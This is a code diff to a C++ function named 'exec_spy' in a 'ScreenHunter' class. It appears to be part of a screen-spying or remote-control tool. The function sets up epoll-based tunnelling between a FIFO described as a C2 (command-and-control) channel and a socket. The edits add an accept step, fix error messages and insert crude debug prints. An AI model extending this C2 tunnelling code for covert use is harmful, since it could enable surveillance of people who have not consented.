@@ -1,7 +1,12 @@
 #include "screen_hunter.hpp"
 
 void ScreenHunter::exec_spy() {
-    int rc;
+    int rc = accept_tunnel_end();
+    
+    if (rc < 0) {
+        return;
+    }
+
     fifo_in_ = fifo_path_ + (std::string) "_in"; // screen hunter command line READ_ONLY
 
     int tunnel_fifo_in_ = open(fifo_in_.c_str(), O_RDONLY | O_NONBLOCK);
@@ -13,7 +18,7 @@ void ScreenHunter::exec_spy() {
     ScopedEpollFD epoll_fd;
     rc = create_epoll_fd(epoll_fd);
     if (rc < 0) {
-        write_fifo_error("[SpyTunnel::run] Error adding tunnel_socket_ to epoll" + std::string(strerror(errno)));
+        write_fifo_error("[SpyTunnel::run] Error creating epoll_fd" + std::string(strerror(errno)));
         return;
     }
 
@@ -21,7 +26,7 @@ void ScreenHunter::exec_spy() {
     screen_hunter_c2_event.data.fd = tunnel_fifo_in_;
     screen_hunter_c2_event.events = EPOLLIN;
     if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_fifo_in_, &screen_hunter_c2_event) < 0) {
-        write_fifo_error("[SpyTunnel::run] Error adding tunnel_socket_ to epoll" + std::string(strerror(errno)));
+        write_fifo_error("[SpyTunnel::run] Error adding screen hunter c2 event" + std::string(strerror(errno)));
         return;
     }
 
@@ -29,7 +34,8 @@ void ScreenHunter::exec_spy() {
     screen_hunter_tunnel_end_event.data.fd = tunnel_end_socket_;
     screen_hunter_tunnel_end_event.events = EPOLLIN;
     if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_end_socket_, &screen_hunter_tunnel_end_event) < 0) {
-        write_fifo_error("[SpyTunnel::run] Error adding tunnel_socket_ to epoll" + std::string(strerror(errno)));
+        std::cout << MAGENTA << "tunnel_end_socket_=" << tunnel_end_socket_ << std::endl;
+        write_fifo_error("[SpyTunnel::run] Error adding tunnel_end_socket_ to epoll" + std::string(strerror(errno)));
         return;
     }
 
@@ -39,6 +45,7 @@ void ScreenHunter::exec_spy() {
     struct epoll_event events[3];
     while (true) {
         int nfds = epoll_wait(epoll_fd.fd, events, 3, -1);
+        std::cout << MAGENTA << "Shit1" <<  RESET;
 
         if (nfds < 0) {
             return;
@@ -46,6 +53,7 @@ void ScreenHunter::exec_spy() {
 
         for (int i=0;i<nfds;i++) {
             if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
+                std::cout << MAGENTA << "Shit2" <<  RESET;
                 // Server shuts down
                 uint64_t u;
                 read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
@@ -90,6 +98,7 @@ void ScreenHunter::exec_spy() {
                     close(tunnel_fifo_in_);
                     return;
                 }
+                std::cout << MAGENTA << "Shit3" <<  RESET;
 
                 rc = write(tunnel_fifo_, buffer, rc);
                 if (rc <= 0) {
